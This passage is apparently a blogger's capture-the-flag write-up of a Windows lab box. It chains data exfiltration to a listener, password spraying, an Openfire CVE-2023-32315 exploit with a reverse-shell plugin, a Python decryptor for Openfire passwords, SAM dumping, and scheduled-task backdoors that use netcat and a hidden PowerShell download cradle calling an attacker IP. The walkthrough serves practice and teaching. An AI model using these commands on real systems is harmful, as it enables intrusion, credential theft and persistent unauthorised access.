$b64\n$b64 = [System.Convert]::ToBase64String((Get-Content -path \u0026#34;C:\\Users\\blake\\Documents\\app\\instance\\users.db\u0026#34; -Encoding byte)) Start a listener on our host:\nnc -nvlp 8888 Send the base64 encoded string to our listener:\nInvoke-WebRequest -Uri http://10.10.14.20:8888/ -Method POST -Body $b64 Caught base64 on our listener Now we decode the bas64 back into users.db\necho \u0026#34;base64string\u0026#34; | base64 -d -w 0 \u0026gt; users.db Finding Users Passwords in users.db: We can load the users.db file into sqlitebrowser and looking at the user table we can see it contains usernames and passwords\nDiscovering Password Lockout Policy: I cred stuff them using netexec \u0026amp; smb but notice I get lockout warnings.\nI check the password policy and can see that there is a 10 failed password attempt limit that lasts for a duration of 10 minutes.\n+Note+: This would not have been issue as so far we have only found 8 \u0026ldquo;passwords\u0026rdquo; in total however I was also spraying the answers to security questions, which led me to being locked out. Whilst waiting for the password policy locking to finish further hunting I find another db in \\app\\reports\\instance\nI repeat the same process of transferring via base64 as above in-case there is any difference and there is, however it is just additional lines where they are using their names as passwords.\n3. Lateral Movement: Discovering OpenFire\u0026rsquo;s password due to password re-use. Now that the 10 minute lockout time is up we can password spray with netexec, and we see we get a hit for the user OpenFire with our newly found passwords, it turns out Alexander has been naughty and is re-using their password.\nnetexec smb $box -u Users.txt -p Passwords.txt --continue-on-success | grep [+] What is OpenFire? After some quick searching online, we can see that OpenFire is an instant messaging app. Checking the documentation we can see the default port for the service is 9090 and it is by default only accessible from the host itself.\nRunning netstat we can see that it does appear to be running locally.\nnetstat -ano Creating a tunnel with chisel : As OpenFire is running locally we have no way of accessing it without creating a tunnel back to ourselves to access it, so lets do that with chisel .\n+Note+: I would usually use ligolo-ng as that\u0026rsquo;s my preferred tunneling tool however it\u0026rsquo;s been a while since I\u0026rsquo;ve used chisel and this is a good way to dust off the cobwebs. Prerequisite: You will need the binaries, for both Debian (if using kali/parrot etc as an attack machine) and for the target Windows, you can get these from: https://github.com/jpillora/chisel/releases/ Transfer the binary to the target\nwget http://10.10.14.20:9000/chisel.exe -o chisel.exe Start a listener on kali:\n./chisel server -p 8989 --reverse Connect back to our listener on kali and redirect traffic from port 9090 on the target to port 8000 on our attack machine.\n.\\chisel.exe client 10.10.14.20:8989 R:8000:127.0.0.1:9090 Let\u0026rsquo;s verify if we can access the service, and we can.\n+Note+: We can see it\u0026rsquo;s running version 4.7.4 Finding POC for OpenFire CVE-2023-32315 Some quick searching online and we can see there is a vulnerability which affects this version of OpenFire.\nhttps://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT We can download the exploit easily\nwget https://raw.githubusercontent.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT/refs/heads/main/CVE-2023-32315.py Code Review for CVE-2023-32315 exploit: Again I find this incredibly beneficial as a means to actually understand the underlying the mechanism that is being exploited so that it deepens our understanding. If you are already familiar with this exploit and the underlying mechanism I would skip this part, but if you are not there is a lot to learn here + you can learn a lil\u0026rsquo; bit of python too.\nThe exploit itself is only 110 lines long and a large part of this is used to for presentation and basic functionality purpose e.g. making it look nice and calling main functions etc so we can ignore those parts and focus on the actual exploitation parts.\nLibrary Imports: Here we have the imports for libraries.\nimport argparse import subprocess import requests from rich.console import Console These are standard libraries, argparse is for parsing command line arguments and rich.console is used for making things look nice. The libraries doing the heavy lifting in this script are subprocess (like we saw in the previous exploit it is used for running external commands and managing processes from within python \u0026amp; requests is used for HTTP requests. get_csrf_token function: This function is used to extract the csrf token.\ndef get_csrf_token(target_url): try: response = requests.head(target_url + \u0026#34;/login.jsp\u0026#34;) cookies = response.cookies.get_dict() csrf_token = cookies.get(\u0026#39;csrf\u0026#39;) return csrf_token except requests.RequestException: return None This function retrieves the Cross-Site-Request-Forgery(CSRF) token by making a call to the /login.jsp endpoint via a HEAD request.\nIt takes one argument, the target_url (user supplied on execution) it concatenates the supplied url with the endpoint to create target_url/login.jsp.\nIt stores the response in a variable response, then parses the response for cookies and stores them in a dictionary.\nThe dictionary is then checked for the key csrf and then returns that value in the csrf_token variable.\nIf it receives a request exception then it returns the response None instead.\nAs you can see this is just a HEAD request that could be performed in a browser or via cli like so.\n#Command curl -I http://[targetURL]/login.jsp | grep -e \u0026#39;csrf\u0026#39; #Example curl -I http://127.0.0.1:8000/login.jsp | grep -e \u0026#39;csrf\u0026#39; add_credentials function: This is where the exploitation logic is declared.\ndef add_credentials(target_url, csrf_token, username, password): color.print(f\u0026#34;[blue][*][/blue] Launching exploit against: [yellow]{target_url}[/yellow]\u0026#34;) The function takes four arguments, target_url, csrf_token, username, and password. We\u0026rsquo;ve already seen the target_url and csrf_token in previous steps, so the only new inputs here are username and password, used to create a new user.\nFirst, it prints a message indicating that it\u0026rsquo;s launching the exploit against the specified target_url.\nConstructing vulnerable paths \u0026amp; headers:\nNext, it constructs a hard-coded vulnerable path called vuln_path \u0026amp; declares the Headers\nvuln_path = f\u0026#39;/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf={csrf_token}\u0026amp;username={username}\u0026amp;password={password}\u0026amp;passwordConfirm={password}\u0026amp;isadmin=on\u0026amp;create=Create%2bUser\u0026#39; headers = { \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;*/*\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;en-US;q=0.9,en;q=0.8\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;close\u0026#34;, \u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Cookie\u0026#34;: f\u0026#34;csrf={csrf_token}\u0026#34; } What’s interesting here is that the path traversal occurs at the beginning of the URL: /setup/setup-s/%u002e%u002e/%u002e%u002e/, which decodes to ../../ This allows the exploit to reach the user-create.jsp endpoint (an endpoint it normally shouldn’t have access to). The path also includes URL parameters like csrf_token, username, password, and other fields required to create a new admin user.\nThe use of path traversal suggests that attackers could potentially access other unintended endpoints as well \u0026amp; not just user-create.jsp.\n+Note+: After some quick searching I am right it\u0026rsquo;s possible to access other unintended endpoints as outlined in this great article. https://vulncheck.com/blog/openfire-cve-2023-32315 Finally, the headers dictionary includes standard HTTP headers along with the csrf_token again, set as a cookie used to mimic a legitimate session and bypass CSRF protections\ncheck_vuln:\nThe following logic is used to check if the target is valid, perform the exploit \u0026amp; then verify if the exploit has been successful.\ncheck_vuln = requests.get(target_url, headers=headers, verify=False).status_code if check_vuln == 200: color.print(\u0026#34;[green][+][/green] Target is vulnerable\u0026#34;) color.print(\u0026#34;[blue][*][/blue] Adding credentials\u0026#34;) The variable check_vuln uses the requests library to send a GET request to the target_url along with the headers dictionary (containing the previously extracted csrf token). It sets verify=False to skip the SSL certificate validation (this is most likely done as instances of OpenFire will be running internally with self signed certs and will fail SSL validation)\nThe status code is returned back .status_code \u0026amp; checked if it is equal == to 200 (meaning it was successful) it will print out that the target is vulnerable \u0026amp; move onto the next part of the logic, adding credentials.\nadd_credentials_cmd:\nThis logic is for adding the credentials to the target.\nadd_credentials_cmd = f\u0026#34;curl -I -X GET \u0026#39;{target_url}{vuln_path}\u0026#39; \u0026#34; \\ \u0026#34;-H \u0026#39;Accept-Encoding: gzip, deflate\u0026#39; \u0026#34; \\ \u0026#34;-H \u0026#39;Accept: */*\u0026#39; \u0026#34; \\ \u0026#34;-H \u0026#39;Accept-Language: en-US;q=0.9,en;q=0.8\u0026#39; \u0026#34; \\ \u0026#34;-H \u0026#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36\u0026#39; \u0026#34; \\ \u0026#34;-H \u0026#39;Connection: close\u0026#39; \u0026#34; \\ \u0026#34;-H \u0026#39;Cache-Control: max-age=0\u0026#39; \u0026#34; \\ f\u0026#34;-H \u0026#39;Cookie: csrf={csrf_token}\u0026#39;\u0026#34; First a multi-line string is declared which consists of a standard GET (in a way…keep reading) request using curl. We are using the -I flag to actually turn this GET request into a HEAD request.\nFrom the curl man pages.\n-I, --head (HTTP FTP FILE) Fetch the headers only. HTTP-servers feature the command HEAD which this uses to get nothing but the header of a document. When used on an FTP or FILE URL, curl displays the file size and last modification time only. What is strange though is that the logic then uses -X GET which contradicts the -I flag as both flags are trying to control the HTTP method being used. I\u0026rsquo;m unsure if this is intentional or a mistake by the author. Just to note, curl will typically prioritize the -X flag meaning this would still result in a GET request.\nThe target_url \u0026amp; vuln_path are combined to form the final endpoint. If you remember, vuln_path contains the password \u0026amp; username of our new user as well as the other required url parameters to create the new users.\nThe remaining lines contain standard HTTP headers required to mimic a legitimate browser request. the GET request, as well as our csrf_token cookie passed for validation.\nprocess the cmd command:\nThis logic is used for actually sending the malicious request via the subprocess library.\nprocess = subprocess.Popen(add_credentials_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) output, error = process.communicate() if \u0026#34;200\u0026#34; in str(output): color.print(\u0026#34;[green][+][/green] Successfully added, here are the credentials\u0026#34;) color.print(f\u0026#34;[green][+][/green] Username: [green]{username}[/green]\u0026#34;) color.print(f\u0026#34;[green][+][/green] Password: [green]{password}[/green]\u0026#34;) else: color.print(\u0026#34;[red][~][red] Failed to add credentials\u0026#34;) We create a variable called process which opens a new subprocess and executes the add_credentials_cmd curl request defined in the previous step. It opens a shell (to run the command) and captures both stdout and stderr using subprocess.PIPE.\nWe then call process.communicate() which returns a tuple containing the stdout and stderr, which we store in the variables output \u0026amp; error.\nThe logic then checks if the string 200 (a valid HTTP response) is contained in the output (stdout). If does we print a success message otherwise we print a failure messsage.\nexploit function: This is, as you have probably guessed where the exploit logic is executed.\ndef exploit(target_url): username = \u0026#34;hugme\u0026#34; password = \u0026#34;HugmeNOW\u0026#34; try: csrf_token = get_csrf_token(target_url) if csrf_token: add_credentials(target_url, csrf_token, username, password) else: color.print(\u0026#34;[red][~][/red] CSRF token not found in headers. Vulnerability may not exist.\u0026#34;) except requests.RequestException: pass The function takes one argument target_url.\nTwo hard-coded variables are declared username \u0026amp; password, which we saw previously are used to create the user account.\nNext it attempts to retrieve the csrf token by running the csrf_token function, which if successful will return the csrf_token variable, if it is valid e.g. does not return None, it will then run the add_credentials function to create the user on the host. If None e.g. a csrf token is not found it will tell us, suggesting it is not vulnerable.\nAny requests.RequestException errors are caught and ignored pass.\nSide-Quest Recreating the exploit just using curl: This is just to show how simple this exploit is. I like doing side-quests like these to further cement the learning, if you want you can just use the downloaded exploit. But as you\u0026rsquo;ll see it\u0026rsquo;s possible to just recreate this exploit on the command line as it\u0026rsquo;s just two curl commands. The first to retrieve the csrf token and the second to create the user.\n# Set our target url. target_url=\u0026#34;http://127.0.0.1:8000\u0026#34; #Url Encode our Username \u0026amp; Password as these are sent via url username=$(python3 -c \u0026#34;import urllib.parse; print(urllib.parse.quote(\u0026#39;bloodstiller\u0026#39;))\u0026#34;) password=$(python3 -c \u0026#34;import urllib.parse; print(urllib.parse.quote(\u0026#39;bL00dsT11L3r\u0026#39;))\u0026#34;) # Retrieve the \u0026#39;csrf token\u0026#39; curl \u0026#34;$target_url/login.jsp\u0026#34; | grep -i \u0026#39;csrf\u0026#39; csrf_token=\u0026#34;GS7T6L1u3xxBCzq\u0026#34; # Set Vulerable Path vuln_path=\u0026#34;/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=${csrf_token}\u0026amp;username=${username}\u0026amp;password=${password}\u0026amp;passwordConfirm=${password}\u0026amp;isadmin=on\u0026amp;create=Create%2bUser\u0026#34; # Send Curl request curl -L -X GET \u0026#34;$target_url$vuln_path\u0026#34; \\ -H \u0026#34;Accept-Encoding: gzip, deflate\u0026#34; \\ -H \u0026#34;Accept: */*\u0026#34; \\ -H \u0026#34;Accept-Language: en-US;q=0.9,en;q=0.8\u0026#34; \\ -H \u0026#34;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\u0026#34; \\ -H \u0026#34;Connection: close\u0026#34; \\ -H \u0026#34;Cache-Control: max-age=0\u0026#34; \\ -H \u0026#34;Cookie: csrf=$csrf_token\u0026#34; As you can see it threw an Exception (it will do this in python as well however in the python script there is Exception handling) And we are in!\nDiscovering we can upload plugins: Looking around we can see we can upload plugins in the .jar format, which means it should, in theory, be possible to upload shell of some sort.\nAfter some searching online this page details exploiting this specific vulnerability so we can follow this.\nhttps://vulncheck.com/blog/openfire-cve-2023-32315 +Note+: I would encourage reading this as it actually details how to perform the exploit without logging in as a means to avoid logs. It takes advantage of the same CVE-2023-32315 vulnerability to directly upload a malicious plugin. Creating a malicious reverse shell plugin for OpenFire: After some searching online we can find a public java reverse shell\nwget https://raw.githubusercontent.com/LaiKash/JSP-Reverse-and-Web-Shell/refs/heads/main/shell.jsp https://gist.github.com/caseydunham/53eb8503efad39b83633961f12441af0 All we have to do is modify the Port \u0026amp; IP.\nNext we download the example plugin repo from OpenFire.\ngit clone https://github.com/igniterealtime/openfire-exampleplugin.git We copy the shell.jsp to exampleplugin-page.jsp location for compilation\ncp ../shell.jsp ./src/main/web/exampleplugin-page.jsp We will need to install apache maven to compile this exploit, so if you don\u0026rsquo;t have it already run the below to install it.\nsudo apt update \u0026amp;\u0026amp; sudo apt install maven -y Now we need to create the package.\nmvn -B package Once complete you should get a successful build message:\n+Note+: There will most likely be ALOT of output here as maven will download the relevant dependencies etc so be patient. Next we put the plugin into the correct structure for uploading to OpenFire.\ncp ./target/exampleplugin.jar exampleplugin.zip; zip -ur exampleplugin.zip ./plugin.xml ./readme.html; mv exampleplugin.zip ./target/exampleplugin.jar; The correct file is exampleplugin.jar located in target/\nStart a listener:\nrlwrap -cAr nc -nvlp 6969 Next we upload the exploit\nNow we finally trigger the plugin so our reverse shell is active.\ncurl -v \u0026#34;http://127.0.0.1:8000/setup/setup-s/%u002e%u002e/%u002e%u002e/plugins/exampleplugin/exampleplugin-page.jsp?\u0026#34; Again an exception will be thrown but we have our reverse shell.\n4. Privilege Escalation: Privesc as openfire: If you just want to get to the good stuff you can jump straight to openfire DB part, however I left this all in as a means to show it\u0026rsquo;s not as simple \u0026ldquo;you just do x then y then you\u0026rsquo;re root\u0026rdquo; there is more to it.\nCheck for default creds: I run to check for stored credentials however we only get default credentials.\ncmdkey /list What Is virtualapp/didlogical? This one confuses a lot of people. It\u0026rsquo;s actually a default credential entry that Windows creates automatically in certain situations.\nvirtualapp/didlogical is a placeholder credential used internally by Windows often related to services like: Windows Live (Outlook, OneDrive) Remote Desktop/Live Sign-In Credential Manager Virtualized services / Hyper-V The entry doesn’t usually correspond to an actual service or account we can use in any obvious way. It\u0026rsquo;s often just tied to Windows features that sync settings or provide background services.\nEnumerating Users/Groups \u0026amp; privs: Next lets enumerate users groups \u0026amp; privileges.\nwhoami /priv /groups; query user; net user We can see we are a service account and we have limited privileges.\nLets check if any other users are part of interesting groups.\nwhoami /groups; net localgroup \u0026#34;Remote Desktop Users\u0026#34;; net localgroup \u0026#34;Administrators\u0026#34;; net localgroup \u0026#34;DNS Admins\u0026#34;; net localgroup \u0026#34;Backup Operators\u0026#34;; net localgroup \u0026#34;Print Operators\u0026#34;; net localgroup \u0026#34;Server Operators\u0026#34;; net localgroup \u0026#34;Event Log Readers\u0026#34;; net localgroup \u0026#34;Hyper-V Administrators\u0026#34; Again nothing of note, it does not appear any of the users are part of any interesting groups.\nEnumerating Installed Programs: Let\u0026rsquo;s see if there are any interesting programs that we have not looked at so far.\n(\u0026#39;HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\u0026#39;, \u0026#39;HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\u0026#39;) | ForEach-Object { Get-ItemProperty -Path $_ } | Select-Object DisplayName, DisplayVersion, Publisher, InstallLocation | sort-object -Property Displayname -Unique |Format-Table -AutoSize Nothing of note\nChecking PATH and ENV\u0026rsquo;s: PATH\n$Env:PATH There are some interesting things here like SSH and python so we can put a pin in these until we get stuck.\nEnvironmental Variables:\nGet-ChildItem Env: Nothing of note\nNon-disabled Scheduled Tasks: Get-ScheduledTask | Where-Object { $_.State -ne \u0026#39;Disabled\u0026#39; } | Select-Object TaskName, TaskPath, State There was nothing of note here, however I will not show the output as it was pages.\nRunning processes: # Command to exclude standard windows processes tasklist /svc | select-string -Pattern \u0026#34;svchost.*|LSASS*|winlogon*|smss*|csrss*\u0026#34; -NotMatch It does show that nginx.exe is running which is to be expected as a webserver is running.\nWe can see that this is actually what is running ReportLab as when we look at the nginx .conf file in C:\\Program Files (x86)\\nginx-1.24.0\\ it is proxying the traffic from report.solarlab.htb:6791 to the service running on 5000 locally.\nThis is also verifiable by reading the app.py file in C:\\Users\\blake\\Documents\\app\nWe can see that there is also a process called waitress-serve.exe running also.\nBut reading start-app.bat stored in C:\\Users\\blake\\Documents we can see it\u0026rsquo;s also part of this same webstack.\nCheck PowerShell History: Get-ChildItem -Path \u0026#34;$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\u0026#34; | Format-Table -AutoSize Nothing of note…well nothing actually.\nOpenfire DB I look through the openfire folder structure and find there is a file called openfire.script located in C:\\Program Files\\Openfire\\embedded-db initially it confused me as it just appears to be a list of SQL commands, however after some looking online we can find this entry on the openfire discourse which shows the following, letting us know the .script is the actual database.\nLooking through it we can find the below entry which appears to be the entry for the admin user \u0026amp; what looks to be an hashed password.\nINSERT INTO OFUSER VALUES(\u0026#39;admin\u0026#39;,\u0026#39;gjMoswpK+HakPdvLIvp6eLKlYh0=\u0026#39;,\u0026#39;9MwNQcJ9bF4YeyZDdns5gvXp620=\u0026#39;,\u0026#39;yidQk5Skw11QJWTBAloAb28lYHftqa0x\u0026#39;,4096,NULL,\u0026#39;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442\u0026#39;,\u0026#39;Administrator\u0026#39;,\u0026#39;admin@solarlab.htb\u0026#39;,\u0026#39;001700223740785\u0026#39;,\u0026#39;0\u0026#39;) Some further searching also reveals a password key.\nINSERT INTO OFPROPERTY VALUES(\u0026#39;passwordKey\u0026#39;,\u0026#39;hGXiFzsKaAeYLjn\u0026#39;,0,NULL) After some searching online I found some old decryption tools however that\u0026rsquo;s no fun so lets write one in python.\nDecrypting Openfire Passwords with Python (Understanding the Mechanism) I love these kinds of reverse engineering exercises. They’re gold for understanding how applications store and secure (or fail to secure) credentials. If you\u0026rsquo;re familiar with Blowfish encryption or Openfire\u0026rsquo;s password handling, you might want to skip ahead. But if you\u0026rsquo;re not, or just want to level up your Python, this is for you.\nWe’re going to look at a short but powerful Python script that mimics the decryption logic Openfire uses internally to store admin console credentials.\nWhat We\u0026rsquo;re Dealing With: Openfire encrypts passwords using the Blowfish cipher in CBC mode, and stores them hex-encoded with a prepended IV (Initialization Vector). This means if we’ve got the key and the encoded password, we can decrypt it, we just need to replicate Openfire’s process.\nThis is useful for recovering credentials from old backups, reversing malware configs using Openfire, or (you know)…. offensive research.\nHere’s the core decryptor logic we’re going to walk through.\n#!/usr/bin/env python3 from Crypto.Cipher import Blowfish from Crypto.Hash import SHA1 import binascii def decrypt_openfire_pass(ciphertext_hex: str, key: str) -\u0026gt; str: # Convert the key to SHA-1: sha1_key = SHA1.new(key.encode()).digest() # Decode the hex-encoded ciphertext ciphertext = binascii.unhexlify(ciphertext_hex) # Get IV (first 8 bytes) and actual ciphertext iv = ciphertext[:8] encrypted_data = ciphertext[8:] # Decrypt using Blowfish CBC cipher = Blowfish.new(sha1_key, Blowfish.MODE_CBC, iv) decrypted = cipher.decrypt(encrypted_data) # Strip padding (Openfire uses PKCS5/PKCS7-like padding) pad_len = decrypted[-1] return decrypted[:-pad_len].decode(\u0026#34;utf-8\u0026#34;) # Enter our found ciphertext \u0026amp; key ciphertext = \u0026#34;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442\u0026#34; key = \u0026#34;hGXiFzsKaAeYLjn\u0026#34; print(decrypt_openfire_pass(ciphertext, key)) Let’s Break it Down: Each part of this script mimics something Openfire does internally, step by step.\nImporting Libraries: from Crypto.Cipher import Blowfish from Crypto.Hash import SHA1 import binascii Crypto.Cipher.Blowfish gives us the Blowfish cipher in CBC mode. Crypto.Hash is used for generating the encryption key using SHA-1. binascii helps us convert hex-encoded strings to bytes. These are all standard and widely used in Python crypto work — no weird dependencies here.\nCreating the Encryption Key: sha1_key = hashlib.sha1(key.encode()).digest() The original key is not used directly — it’s hashed using SHA-1 to derive a 20-byte key, which is what Openfire expects. The .digest() returns the raw bytes instead of a hex string.\nThis mimics in java:\nMessageDigest sha1 = MessageDigest.getInstance(\u0026#34;SHA-1\u0026#34;); byte[] key = sha1.digest(passphrase.getBytes()); Parsing the Encrypted Password: ciphertext_bytes = binascii.unhexlify(ciphertext_hex) Openfire stores the encrypted string in hex. We decode it to raw bytes using unhexlify.\nExample:\n\u0026#34;f4b5f7...\u0026#34; → b\u0026#34;\\xf4\\xb5\\xf7...\u0026#34; Extracting the IV: iv = ciphertext_bytes[:8] ciphertext = ciphertext_bytes[8:] The IV (initialization vector) is the first 8 bytes of the ciphertext. Blowfish in CBC mode always needs a random IV to prevent repeatable ciphertext, but Openfire conveniently stores the IV in front of the encrypted content.\nDecrypting the Ciphertext: cipher = Blowfish.new(sha1_key, Blowfish.MODE_CBC, iv) decrypted = cipher.decrypt(ciphertext) We create the cipher using the SHA-1-derived key and the IV, then decrypt the ciphertext.\nRemoving Padding: Blowfish has a block size of 8 bytes, so padding is likely used.\npad_len = decrypted[-1] return decrypted[:-pad_len].decode(\u0026#34;utf-8\u0026#34;) Openfire pads the plaintext to match the block size — so we strip trailing null-bytes \\x00s before decoding it as a UTF-8 string.\nAs an example this line turns:\nb\u0026#34;mypassword\\x00\\x00\\x00\u0026#34; → \u0026#34;mypassword\u0026#34; Provide ciphertext \u0026amp; key: ciphertext = \u0026#34;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442\u0026#34; key = \u0026#34;hGXiFzsKaAeYLjn\u0026#34; print(decrypt_openfire_pass(encrypted, key)) This would print the decrypted password stored in Openfire, assuming we have got the key right…..\nCreating a venv to run it in: Now that we have our script we need to install one dependency, pycrptodome, to avoid messing up our base python installation lets create a virtual environment.\n# Create the venv python -m venv openfire-decrypt # Activate it source openfire-decrypt/bin/activate # Install our dependency pip install pycryptodome Decrypting the found password: If we run the decryption tool we should now get the password\npython3 openfiredecrypt.py Verifying The Password is Valid: As we can see this is valid!\nUsing impacket-psexec to get an NT/Authority shell: As there are no other means to connect, let\u0026rsquo;s use impacket-psexec to access the host.\nimpacket-psexec $user@$box Lets get our root flag:\n5. Persistence: Dumping SAM Hashes: As we already have the Administrator password we can create sessions via impacket-psexec anytime we want however we will also dump the SAM hashes too.\n+Note+: I know this is kind of redundant as if they were to change the administrator password we would still be locked out…. impacket-secretsdump $user:$pass@$box Making a new admin user: Let\u0026rsquo;s make a new admin user to be safe.\n#Add the new user net user bloodstiller bl00dst1ll3r! /add #Add the user to local admin net localgroup Administrators bloodstiller /add Verify it works:\nCreating a scheduled task: Just to be safe let\u0026rsquo;s create a scheduled task as NT Authority\\System to call back out to our attack host periodically.\nWhy do this, in the event that the administrator changes the password or our new admin user is deleted this will ensure we can still get a high privileged shell. Granted this is very rudimentary means to do so as most people would use a C2 for this.\nCreating a scheduled task back-door: A great means of creating persistence is to create a scheduled task that runs periodically and calls back out to our attack machine. I\u0026rsquo;ve put two approaches below.\nVersion 1: Using nc64.exe to connect back to our attack host periodically: First we need to transfer nc64.exe binary over.\nWe can create the scheduled task backdoor using schtasks:\nschtasks /create /tn BackDoor /tr \u0026#34;C:\\Users\\Administrator\\Documents\\nc64.exe 10.10.14.31 6666 -e powershell\u0026#34; /sc minute /mo 1 /ru System +Note+: This techniques runs every 1 minute and calls out to my attack machine. This means that even if I disconnect I can turn on my listener again and it will call back out to our attack host: Shell Caught\nJust to double check I disconnect to ensure it calls back out to me:\nScheduled Task Backdoor Command Breakdown Running a Binary:\nCommand Breakdown: schtasks /create Creates a new scheduled task on Windows. /tn BackDoor Sets the task name to BackDoor. This name is how the task will appear in the Task Scheduler. /tr \u0026quot;C:\\Users\\Administrator\\Documents\\nc64.exe 10.10.14.31 6666 -e powershell\u0026quot; Specifies the action that the task will execute. Path: \u0026quot;C:\\Users\\Administrator\\Documents\\nc64.exe\u0026quot; Path to nc64.exe, used to open a reverse shell. IP Address*: 10.10.14.31 Our attack machine that is listening where the reverse shell will connect. Port: 6666 The port number on our attack machine listening for the connection. Flag: -e powershell The -e flag executes powershell.exe upon connection, providing a command shell. /sc minute Sets the task\u0026rsquo;s schedule frequency to every minute. /mo 1 Modifier that, when used with /sc minute, runs the task every 1 minute. /ru System Specifies that the task should run with System privileges. Running as System grants high privileges, making this backdoor more dangerous. Version 2: Using a base64 encoded PowerShell reverse shell and download cradle to connect back to our attack host: So using the above method with nc64.exe is great and all, but an n64.exe binary will stick out like a sore thumb. A better option would be to create a powershell script and use a download cradle to call back to ourselves, this way everything is loaded in memory and nothing is written to the disk (bar our registry entry)\nCreate our reverse-shell script:\nWe can use a base64 obfuscated powershell reverse shell. I like using https://revshells.com for this\nWe then need to create our scheduled task:\nschtasks /create /tn CradleScript /tr \u0026#34;c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c \u0026#39;IEX ((New-Object Net.WebClient).DownloadString(\u0026#39;\u0026#39;http://10.10.14.31:7070/script.ps1\u0026#39;\u0026#39;\u0026#39;))\u0026#39;\u0026#34; /sc minute /mo 1 /ru System Start our listener \u0026amp; webserver:\nWebserver: python3 -m http.server 7070 Listener: rlwrap -cAr nc -nvlp 53 The task grabs our script \u0026amp; immediatley executes it in memory:\nWe get our revere shell:\nDouble check by disconnecting \u0026amp; seeing if it re-connects and it does: - Scheduled Task Backdoor Utilizing Download Cradle Command Breakdown:\nschtasks /create Creates a new scheduled task on Windows. /tn CradleScript Sets the task name to CradleScript. This name is how the task will appear in the Task Scheduler. /tr \u0026quot;c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe Specifies the action that the task will execute. powershell.exe: Starts PowerShell. Arguments passed to powershell: -WindowStyle hidden: Runs the task in a hidden window to prevent showing the PowerShell window. NoLogo -NonInteractive -ep bypass -nop: PowerShell flags to suppress output and allow script execution bypassing restrictions. IEX ((New-Object Net.WebClient).DownloadString(...)): Uses Invoke-Expression to download and immediately execute the script. /sc minute /mo 1: Sets the task to run every 1 minute. /ru System: Runs the task under System privileges. Lessons Learned: What did I learn? I got to brush up on my python skills which was nice as I have been looking to getting back into programming more, so to build a decryption script and breakdown what is going on with the exploits was nice to do. I learned that openfire exists, I didn\u0026rsquo;t even know it existed before this. I got to brush off the cobwebs, it\u0026rsquo;s been a while since I did a box as I have had a lot of \u0026ldquo;life\u0026rdquo; stuff going on so it was good to get back into the groove and grind this box. What silly mistakes did I make? Had url encoding on in burpsuite whilst password spraying that cost me time. Again I didn\u0026rsquo;t have url encoding on when I was manually passing passwords via curl for the openfire exploit. I forgot that the requests library would encode the required username and password when passing it, but for some reason forgot I would need to explicitly state this in my manual script. So I was goosed twice by url encoding. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at bloodstiller dot com\n",
